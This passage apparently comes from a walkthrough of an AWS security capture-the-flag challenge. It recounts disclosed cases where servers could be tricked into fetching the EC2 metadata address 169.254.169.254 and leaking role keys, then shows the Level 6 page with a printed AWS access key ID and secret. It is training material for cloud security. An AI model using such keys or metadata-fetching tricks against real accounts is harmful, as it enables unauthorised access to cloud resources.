  <li><a href="https://twitter.com/Agarri_FR">Nicolas Grégoire</a> discovered that prezi allowed you point their servers at a URL to include as content in a slide, and this allowed you to point to 169.254.169.254 which provided the access key for the EC2 intance profile (<a href="https://engineering.prezi.com/prezi-got-pwned-a-tale-of-responsible-disclosure-ccdc71bb6dd1?gi=c0ec39b6236a">link</a>).  He also found issues with access to that magic IP with <a href="https://hackerone.com/reports/53088">Phabricator</a> and <a href="https://hackerone.com/reports/53004">Coinbase</a>. 
</ul>

A similar problem to getting access to the IAM profile's access keys is access to the EC2's user-data, which people sometimes use to pass secrets to the EC2 such as API keys or credentials.

<h3>Avoiding this mistake</h3>
Ensure your applications do not allow access to 169.254.169.254 or any local and private IP ranges.  Additionally, ensure that IAM roles are restricted as much as possible.

<hr size=3 color="#00d000" />
<h1>Level 6</h1>
For this final challenge, you're getting a user access key that has the SecurityAudit policy attached to it.  See what else it can do and what else you might find in this AWS account.

<p>Access key ID: AKIAJFQ6E7BY57Q3OBGA<br>
Secret: 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<br> 

<p>Need a hint?  Go to  <a href="./hint1.html">Hint 1</a>

<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>ubuntu@ubuntu-2204:~/.aws$
```

we got level 6 access keys 

lets we move into Level 6